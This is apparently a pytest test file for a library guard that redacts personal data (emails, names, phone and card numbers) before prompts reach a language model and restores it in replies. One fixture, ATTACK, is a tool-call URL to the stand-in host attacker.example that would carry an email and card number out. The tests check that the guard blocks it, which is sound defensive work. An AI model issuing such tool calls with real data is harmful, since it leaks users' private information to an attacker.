"""
Tests for :mod:`scikitplot.cleanprompt._guard`.

Notes
-----
**Developer notes.** ``TestStream`` holds :class:`StreamDecoder` to the
property it promises: *every* chunking of a reply decodes to exactly what the
whole reply decodes to. It is checked over thousands of random chunkings for
both styles, because the first implementation passed hand-written cases and
failed this one (a complete surrogate cut short by a shorter one's prefix).
"""

from __future__ import annotations

import json
import random

import pytest

from .. import FluentCleanPrompt, LeakError
from .._exceptions import CleanPromptError
from .._guard import Guard, StreamDecoder
from .._runtime import Cleaner


def _echo(safe):
    return "You said: " + safe


class TestOutgoing:
    def test_the_model_never_sees_a_value(self):
        seen = []
        with FluentCleanPrompt().packs("patient").guard() as guard:
            answer = guard.ask(
                "MRN: 00412345, mail ann@example.com",
                lambda safe: seen.append(safe) or safe,
            )
        assert "00412345" not in seen[0] and "ann@example.com" not in seen[0]
        assert answer == "MRN: 00412345, mail ann@example.com"

    def test_a_leak_is_refused_before_the_call(self):
        guard = FluentCleanPrompt().packs("personal").remember(False).guard()
        guard.outgoing("name: Marion Holt")
        called = []
        with pytest.raises(LeakError) as caught:
            guard.ask("Marion Holt called", lambda safe: called.append(safe) or safe)
        assert called == []
        assert caught.value.kinds == ("PERSON",)
        assert "Marion" not in str(caught.value)

    def test_remember_makes_the_same_text_safe(self):
        guard = FluentCleanPrompt().packs("personal").guard()
        guard.outgoing("name: Marion Holt")
        assert guard.outgoing("Marion Holt called") == "[PERSON-1] called"

    def test_verify_can_be_turned_off(self):
        guard = Guard(
            FluentCleanPrompt().packs("personal").remember(False).materialize(),
            verify=False,
        )
        guard.outgoing("name: Marion Holt")
        assert guard.outgoing("Marion Holt called") == "Marion Holt called"

    def test_a_format_the_plan_cannot_read_as_text_is_refused_at_construction(self):
        with pytest.raises(CleanPromptError):
            Guard(Cleaner(), format="docx")

    def test_the_call_must_return_text(self):
        with pytest.raises(TypeError):
            Guard().ask("hi", lambda safe: 42)


class TestChat:
    def test_every_message_and_part_is_guarded(self):
        messages = [
            {"role": "system", "content": "You help ann@example.com"},
            {
                "role": "user",
                "content": [{"type": "text", "text": "Call +1 555 010 4477"}],
            },
            {"role": "assistant", "content": None, "tool_calls": []},
        ]
        seen = []

        def call(guarded):
            seen.append(guarded)
            return {
                "role": "assistant",
                "content": "Done for " + guarded[0]["content"].split()[-1],
            }

        reply = Guard().chat(messages, call)
        text = json.dumps(seen[0])
        assert "ann@example.com" not in text and "555 010 4477" not in text
        assert seen[0][2] == messages[2]
        assert reply["content"] == "Done for ann@example.com"

    def test_a_part_that_cannot_be_inspected_is_not_sent(self):
        message = {
            "role": "user",
            "content": [{"type": "image_url", "image_url": {"url": "data:..."}}],
        }
        with pytest.raises(CleanPromptError, match="cannot be inspected"):
            Guard().chat([message], lambda guarded: "x")


class TestObjects:
    def test_tool_results_and_arguments_round_trip(self):
        guard = Guard()
        result = {
            "customer": {"email": "ann@example.com", "visits": 3, "tags": ["vip", None]}
        }
        safe = guard.encode_object(result)
        assert "ann@example.com" not in json.dumps(safe)
        assert safe["customer"]["visits"] == 3
        assert guard.decode_object(safe) == result
        arguments = json.dumps({"to": safe["customer"]["email"]})
        assert json.loads(guard.decode_object(arguments)) == {"to": "ann@example.com"}

    def test_an_unknown_type_is_refused(self):
        with pytest.raises(TypeError):
            Guard().encode_object({"when": object()})


class TestStream:
    def _reply(self, style):
        guard = FluentCleanPrompt().packs("all").style(style).guard()
        guard.outgoing(
            "name,email\nMarion Holt,ann@example.com\nMarion,bob@example.org\n", "csv"
        )
        guard.outgoing("df = df[['acct_balance_usd']]\n", "python")
        safe = guard.outgoing(
            "Call Marion Holt, Marion and ann@example.com; mrn 20417 /home/ann/x.csv"
        )
        return (
            guard,
            "Sure: "
            + safe
            + " [EMAIL-1] \\[EMAIL-2\\] [email_1] [EMAIL-\n1] end "
            + safe,
        )

    @pytest.mark.parametrize("style", ["placeholder", "surrogate"])
    def test_any_chunking_decodes_like_the_whole(self, style):
        guard, reply = self._reply(style)
        whole = guard.incoming(reply)
        rng = random.Random(0)
        for _ in range(600):
            decoder, out, index = guard.stream(), [], 0
            while index < len(reply):
                size = rng.randint(1, 9)
                out.append(decoder.feed(reply[index : index + size]))
                index += size
            out.append(decoder.flush())
            assert "".join(out) == whole

    def test_one_character_at_a_time(self):
        guard, reply = self._reply("placeholder")
        decoder = guard.stream()
        assert "".join(
            decoder.feed(char) for char in reply
        ) + decoder.flush() == guard.incoming(reply)

    def test_chunks_must_be_text(self):
        with pytest.raises(TypeError):
            StreamDecoder(Guard()).feed(b"x")


def test_clearing_ends_the_conversation():
    guard = Guard()
    guard.outgoing("ann@example.com")
    guard.clear()
    with pytest.raises(CleanPromptError, match="cleared"):
        guard.incoming("[EMAIL-1]")


class TestConcurrency:
    """CP-067: one guard shared by threads never gives two values one label."""

    @pytest.mark.parametrize("trial", range(3))
    def test_threads_sharing_a_guard(self, trial):
        from ._concurrency import hammer

        guard = FluentCleanPrompt().guard()
        assert hammer(guard.outgoing, guard.incoming) == []

    def test_threads_sharing_a_cleaner(self):
        from ._concurrency import hammer

        cleaner = FluentCleanPrompt().materialize()
        assert hammer(lambda t: cleaner.encode_text(t).text, cleaner.decode) == []


class TestAsync:
    """The same gate for asynchronous clients, with no event-loop dependency."""

    def test_aask_encodes_awaits_and_decodes(self):
        import asyncio

        guard = FluentCleanPrompt().guard()
        seen = []

        async def model(prompt):
            seen.append(prompt)
            await asyncio.sleep(0)
            return "Reply to " + prompt.split()[-1]

        answer = asyncio.run(guard.aask("mail ann@example.com", model))
        assert seen == ["mail [EMAIL-1]"]
        assert answer == "Reply to ann@example.com"

    def test_aask_refuses_before_the_call(self):
        import asyncio

        guard = FluentCleanPrompt().remember(False).guard()
        guard.outgoing("name,phone\nMarion Holt,+1 555 010 4477\n", "csv")
        called = []

        async def model(prompt):
            called.append(prompt)
            return prompt

        with pytest.raises(LeakError):
            asyncio.run(guard.aask("Is Marion Holt there?", model))
        assert called == []

    def test_a_plain_function_is_refused_with_the_fix(self):
        import asyncio

        guard = FluentCleanPrompt().guard()
        with pytest.raises(TypeError, match="use ask"):
            asyncio.run(guard.aask("hi", lambda prompt: prompt))

    def test_achat_decodes_a_mapping(self):
        import asyncio

        guard = FluentCleanPrompt().guard()

        async def chat(messages):
            return {"role": "assistant", "content": "to " + messages[0]["content"]}

        reply = asyncio.run(
            guard.achat([{"role": "user", "content": "ann@example.com"}], chat)
        )
        assert reply == {"role": "assistant", "content": "to ann@example.com"}

    @pytest.mark.parametrize("seed", range(20))
    def test_both_stream_helpers_equal_decoding_the_whole(self, seed):
        import asyncio

        guard = FluentCleanPrompt().guard()
        safe = guard.outgoing(
            "Mail ann@example.com, bob@example.org and ann@example.com"
        )
        reply = "Sent: " + safe + " [EMAIL-9]"
        rng = random.Random(seed)
        cuts = sorted(rng.sample(range(1, len(reply)), rng.randint(0, 12)))
        chunks = [reply[a:b] for a, b in zip([0, *cuts], [*cuts, len(reply)])]
        whole = guard.incoming(reply)
        pieces = list(guard.decode_stream(chunks))
        assert "".join(pieces) == whole and all(pieces)

        async def source():
            for chunk in chunks:
                await asyncio.sleep(0)
                yield chunk

        async def collect():
            return [piece async for piece in guard.adecode_stream(source())]

        assert "".join(asyncio.run(collect())) == whole

    def test_a_chunk_that_is_not_text_is_refused(self):
        guard = FluentCleanPrompt().guard()
        with pytest.raises(TypeError, match="chunk must be str"):
            list(guard.decode_stream(["ok", b"bytes"]))

    def test_gather_with_threads_keeps_one_label_per_value(self):
        import asyncio

        guard = FluentCleanPrompt().guard()

        async def model(prompt):
            await asyncio.sleep(0)
            return prompt

        async def main():
            texts = [f"mail u{i}@example.com" for i in range(60)]
            threaded = [asyncio.to_thread(guard.outgoing, t) for t in texts[:30]]
            direct = [guard.aask(t, model) for t in texts[30:]]
            safe = await asyncio.gather(*threaded)
            answers = await asyncio.gather(*direct)
            return texts, safe, answers

        if not hasattr(asyncio, "to_thread"):  # Python 3.8
            pytest.skip("asyncio.to_thread needs Python 3.9")
        texts, safe, answers = asyncio.run(main())
        assert [guard.incoming(s) for s in safe] == texts[:30]
        assert answers == texts[30:]
        assert len(set(safe)) == 30


class TestRememberedVariants:
    """CP-070: a hidden value is hidden however it is written again."""

    CSV = "name,phone\nMarion Holt,+1 555 010 4477\nO'Brien,+1 555 010 4478\n"

    @pytest.mark.parametrize(
        "text",
        [
            "Call MARION HOLT today.",
            "Call marion holt today.",
            "Call Marion\nHolt today.",
            "Call Marion Holt today.",
            "Call Marion  Holt today.",
            "Call Ｍarion Holt today.",
            "Call O’Brien today.",
        ],
    )
    def test_hidden_with_remember_and_refused_without(self, text):
        guard = FluentCleanPrompt().guard()
        guard.outgoing(self.CSV, "csv")
        safe = guard.outgoing(text)
        assert "arion" not in safe.lower() and "brien" not in safe.lower()
        assert guard.incoming(safe) == text  # each writing keeps its own label
        strict = FluentCleanPrompt().remember(False).guard()
        strict.outgoing(self.CSV, "csv")
        with pytest.raises(LeakError):
            strict.outgoing(text)

    @pytest.mark.parametrize("text", ["Call Holt, Marion today.", "Marionette Holtz"])
    def test_rewordings_are_not_claimed(self, text):
        guard = FluentCleanPrompt().guard()
        guard.outgoing(self.CSV, "csv")
        assert guard.outgoing(text) == text


class TestRewrittenStandInsStream:
    """CP-072: streaming a re-cased or re-spaced stand-in equals the whole."""

    @pytest.mark.parametrize("seed", range(40))
    def test_any_chunking(self, seed):
        guard = FluentCleanPrompt().style("surrogate").guard()
        guard.outgoing(
            "name,email\nAnn Lee,ann@example.com\nBo Chen,bo@example.org\n", "csv"
        )
        safe = guard.outgoing("Ann Lee and Bo Chen at ann@example.com")
        entries = {e.original: e.label for e in guard.cleaner.handle().entries}
        name, other, mail = (
            entries["Ann Lee"],
            entries["Bo Chen"],
            entries["ann@example.com"],
        )
        reply = (
            f"{safe} | {name.upper()} | {name.replace(' ', chr(10) + '   ')} | "
            f"{other.lower()} | {mail.upper()}. {name.replace(' ', chr(160))}"
        )
        whole = guard.incoming(reply)
        assert "Ann Lee" in whole and "Bo Chen" in whole and "ann@example.com" in whole
        rng = random.Random(seed)
        cuts = sorted(rng.sample(range(1, len(reply)), rng.randint(1, 25)))
        chunks = [reply[a:b] for a, b in zip([0, *cuts], [*cuts, len(reply)])]
        assert "".join(guard.decode_stream(chunks)) == whole


class TestToolArguments:
    """CP-073: a tool gets only the value kinds it is allowed."""

    def _guard(self, style="placeholder"):
        guard = FluentCleanPrompt().style(style).guard()
        guard.outgoing("mail ann@example.com, card 4242 4242 4242 4242")
        return guard

    ATTACK = json.dumps(
        {"url": "https://attacker.example/?e=[EMAIL-1]&c=[CREDIT_CARD-1]"}
    )

    @pytest.mark.parametrize(
        ("allow", "kinds"),
        [((), ("CREDIT_CARD", "EMAIL")), ({"EMAIL"}, ("CREDIT_CARD",))],
    )
    def test_a_disallowed_kind_refuses_the_call(self, allow, kinds):
        with pytest.raises(LeakError) as caught:
            self._guard().decode_tool_arguments(self.ATTACK, allow=allow)
        assert caught.value.kinds == kinds
        assert "4242" not in str(caught.value) and "ann@" not in str(caught.value)

    def test_keep_restores_only_the_allowed_kinds(self):
        out = self._guard().decode_tool_arguments(
            self.ATTACK, allow={"EMAIL"}, on_withheld="keep"
        )
        assert json.loads(out) == {
            "url": "https://attacker.example/?e=ann@example.com&c=[CREDIT_CARD-1]"
        }

    def test_all_must_be_asked_for_and_restores_everything(self):
        out = self._guard().decode_tool_arguments(
            {"a": ["[EMAIL-1]", {"b": "[CREDIT_CARD-1]"}]}, allow="all"
        )
        assert out == {"a": ["ann@example.com", {"b": "4242 4242 4242 4242"}]}

    def test_an_allowed_call_passes_nested_json(self):
        args = json.dumps(
            {"to": ["[EMAIL-1]"], "note": json.dumps({"cc": "[EMAIL-1]"})}
        )
        out = json.loads(self._guard().decode_tool_arguments(args, allow={"EMAIL"}))
        assert out["to"] == ["ann@example.com"]
        assert json.loads(out["note"]) == {"cc": "ann@example.com"}

    def test_a_rewritten_stand_in_is_still_counted(self):
        guard = self._guard("surrogate")
        stand_in = next(
            e.label for e in guard.cleaner.handle().entries if e.kind == "EMAIL"
        )
        with pytest.raises(LeakError):
            guard.decode_tool_arguments({"q": stand_in.upper()}, allow=())

    @pytest.mark.parametrize(
        ("kwargs", "match"),
        [
            ({"allow": "EMAIL"}, "iterable of kinds"),
            ({"allow": [1]}, "kind names"),
            ({"allow": (), "on_withheld": "drop"}, "on_withheld"),
        ],
    )
    def test_arguments_are_validated(self, kwargs, match):
        with pytest.raises(ValueError, match=match):
            self._guard().decode_tool_arguments({}, **kwargs)

    def test_allow_is_required(self):
        with pytest.raises(TypeError):
            self._guard().decode_tool_arguments({})

    def test_the_refusal_is_audited_without_values(self):
        import io

        from .. import configure_logging

        stream = io.StringIO()
        configure_logging("info", "json", stream=stream)
        try:
            with pytest.raises(LeakError):
                self._guard().decode_tool_arguments(self.ATTACK, allow=())
        finally:
            configure_logging("warning", stream=io.StringIO())
        events = [json.loads(line) for line in stream.getvalue().splitlines()]
        withheld = [e for e in events if e.get("event") == "withheld"]
        assert withheld and withheld[0]["kinds"] == ["CREDIT_CARD", "EMAIL"]
        assert (
            "4242" not in stream.getvalue()
            and "ann@example.com" not in stream.getvalue()
        )


class TestChatLeavesToolCallsEncoded:
    """CP-073: chat() decodes text, never a tool call's arguments."""

    def _guard(self):
        guard = FluentCleanPrompt().guard()
        guard.outgoing("mail ann@example.com")
        return guard

    def test_openai_shape(self):
        call = {
            "id": "1",
            "type": "function",
            "function": {"name": "f", "arguments": '{"to": "[EMAIL-1]"}'},
        }
        reply = self._guard().chat(
            [{"role": "user", "content": "hi"}],
            lambda messages: {
                "role": "assistant",
                "content": "for [EMAIL-1]",
                "tool_calls": [call],
            },
        )
        assert reply["content"] == "for ann@example.com"
        assert reply["tool_calls"] == [call]

    def test_anthropic_shape(self):
        use = {"type": "tool_use", "id": "t", "name": "f", "input": {"to": "[EMAIL-1]"}}
        reply = self._guard().chat(
            [{"role": "user", "content": "hi"}],
            lambda messages: {
                "role": "assistant",
                "content": [{"type": "text", "text": "[EMAIL-1]"}, use],
            },
        )
        assert reply["content"] == [{"type": "text", "text": "ann@example.com"}, use]


class TestEncodeObjectReadsTheWholeDocument:
    """CP-076, CP-077: keys and numbers are read, not only strings."""

    def test_keys_numbers_and_prose(self):
        guard = FluentCleanPrompt().guard()
        out = guard.encode_object(
            {
                "ann@example.com": {"card": 4242424242424242, "orders": 3},
                "notes": ["password: hunter2hunter2"],
            }
        )
        dumped = json.dumps(out)
        assert "ann@example.com" not in dumped and "4242424242424242" not in dumped
        assert "hunter2hunter2" not in dumped and out["[EMAIL-1]"]["orders"] == 3

    def test_a_held_value_as_a_key_is_refused_without_remember(self):
        guard = FluentCleanPrompt().remember(False).guard()
        guard.outgoing("name,phone\nMarion Holt,+1 555 010 4477\n", "csv")
        with pytest.raises(LeakError):
            guard.encode_object({"Marion Holt": {"visits": 2}})

    def test_json_semantics_are_explicit(self):
        guard = FluentCleanPrompt().guard()
        assert guard.encode_object({1: ("a", None, True, 2.5)}) == {
            "1": ["a", None, True, 2.5]
        }

    @pytest.mark.parametrize(
        ("value", "error"),
        [
            ({"x": float("nan")}, ValueError),
            ({"x": b"bytes"}, TypeError),
            ({"x": {1, 2}}, TypeError),
        ],
    )
    def test_what_json_cannot_carry_is_refused(self, value, error):
        with pytest.raises(error):
            FluentCleanPrompt().guard().encode_object(value)

    def test_a_plan_without_json_says_so(self):
        guard = FluentCleanPrompt().formats("text").guard()
        with pytest.raises(CleanPromptError, match="json"):
            guard.encode_object({"a": "b"})
        assert guard.encode_object("mail ann@example.com") == "mail [EMAIL-1]"
